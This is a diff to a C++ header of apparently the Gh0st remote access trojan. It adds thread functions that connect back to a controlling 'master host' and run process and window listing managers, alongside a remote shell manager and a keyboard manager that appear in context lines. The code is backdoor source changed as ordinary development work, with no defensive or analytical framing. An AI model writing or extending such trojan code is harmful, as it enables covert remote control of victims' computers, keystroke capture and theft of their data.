@@ -1,6 +1,6 @@
 #pragma once
 
-
+#include <wininet.h>
 #include "../DllServer/KernelManager.h"
 //#include "FileManager.h"
 //#include "ScreenManager.h"
@@ -10,8 +10,9 @@
 #include "SystemManager/SystemManager.h"
 #include "KeyboardManager/KeyboardManager.h"
 #include "Until/until.h"
+#include "Others/macros.h"
 //#include "install.h"
-#include <wininet.h>
+
 
 extern bool g_bSignalHook;
 
@@ -39,6 +40,34 @@ DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
 	// 在构造函数里用管道与UI进行交互
 	Gh0st::CShellManager manager(&socketClient);
 	
+	socketClient.run_event_loop();
+
+	return 0;
+}
+
+// 进程管理
+DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
+{
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+
+	CSystemManager	manager(&socketClient, COMMAND_PSLIST);
+
+	socketClient.run_event_loop();
+
+	return 0;
+}
+
+// 窗口管理
+DWORD WINAPI Loop_WindowManager(SOCKET sRemote)
+{
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+
+	CSystemManager	manager(&socketClient, COMMAND_WSLIST);
+
 	socketClient.run_event_loop();
 
 	return 0;
@@ -113,18 +142,7 @@ DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
 	return 0;
 }
 
-DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
-{	
-	CClientSocket	socketClient;
-	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
-		return -1;
-	
-	CSystemManager	manager(&socketClient);
-	
-	socketClient.run_event_loop();
 
-	return 0;
-}
 
 //DWORD WINAPI Loop_DownManager(LPVOID lparam)
 //{
